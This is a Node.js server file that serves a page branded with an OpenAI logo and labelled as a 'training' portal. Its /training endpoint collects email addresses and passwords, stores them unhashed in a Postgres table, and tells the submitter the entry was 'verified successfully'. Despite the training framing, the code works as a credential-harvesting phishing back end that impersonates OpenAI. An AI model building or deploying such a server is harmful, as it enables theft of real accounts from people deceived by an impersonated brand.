const http = require("http");
const fs = require("fs");
const path = require("path");
const { Pool } = require("pg");

const PORT = process.env.PORT || 3000;
const INDEX_FILE = path.join(__dirname, "index.html");

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL
    ? { rejectUnauthorized: false }
    : false
});

function sendJSON(res, statusCode, data) {
  res.writeHead(statusCode, {
    "Content-Type": "application/json; charset=utf-8"
  });

  res.end(JSON.stringify(data));
}

function sendPage(res) {
  fs.readFile(INDEX_FILE, "utf8", (error, html) => {
    if (error) {
      console.error(error);
      sendJSON(res, 500, {
        success: false,
        message: "Training page could not be loaded."
      });
      return;
    }

    res.writeHead(200, {
      "Content-Type": "text/html; charset=utf-8"
    });

    res.end(html);
  });
}

async function handleTrainingSubmission(req, res) {
  let body = "";

  req.on("data", chunk => {
    body += chunk;

    if (body.length > 10000) {
      req.destroy();
    }
  });

  req.on("end", async () => {
    try {
      const data = JSON.parse(body);

      const email =
        typeof data.email === "string"
          ? data.email.trim()
          : "";

      const password =
        typeof data.password === "string"
          ? data.password.trim()
          : "";

      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!emailPattern.test(email)) {
        sendJSON(res, 400, {
          success: false,
          message: "Please enter a valid email address."
        });
        return;
      }

      if (!password) {
        sendJSON(res, 400, {
          success: false,
          message: "Enter your password."
        });
        return;
      }

      if (!process.env.DATABASE_URL) {
        console.error("DATABASE_URL is not configured.");

        sendJSON(res, 500, {
          success: false,
          message: "Training database is not configured."
        });
        return;
      }

      await pool.query(`
        CREATE TABLE IF NOT EXISTS training_submissions (
          id SERIAL PRIMARY KEY,
          email TEXT NOT NULL,
          password TEXT NOT NULL,
          submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
      `);

      await pool.query(
        `INSERT INTO training_submissions
         (email, password)
         VALUES ($1, $2)`,
        [email, password]
      );

      console.log("Training submission stored.");

      sendJSON(res, 200, {
        success: true,
        message: "Training entry verified successfully."
      });

    } catch (error) {
      console.error("Submission error:", error);

      sendJSON(res, 500, {
        success: false,
        message: "Unable to save the training submission."
      });
    }
  });
}

const server = http.createServer((req, res) => {
  if (req.method === "GET" && req.url === "/OpenAI.jpg") {
    const logoPath = path.join(__dirname, "OpenAI.jpg");

    fs.readFile(logoPath, (error, image) => {
      if (error) {
        res.writeHead(404);
        res.end("Logo not found");
        return;
      }

      res.writeHead(200, {
        "Content-Type": "image/jpeg"
      });

      res.end(image);
    });

    return;
  }

  if (req.method === "GET" && req.url === "/") {
    sendPage(res);
    return;
  }

  if (req.method === "POST" && req.url === "/training") {
    handleTrainingSubmission(req, res);
    return;
  }

  sendJSON(res, 404, {
    success: false,
    message: "Page or endpoint not found."
  });
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`OpenAI training server running on port ${PORT}`);
});

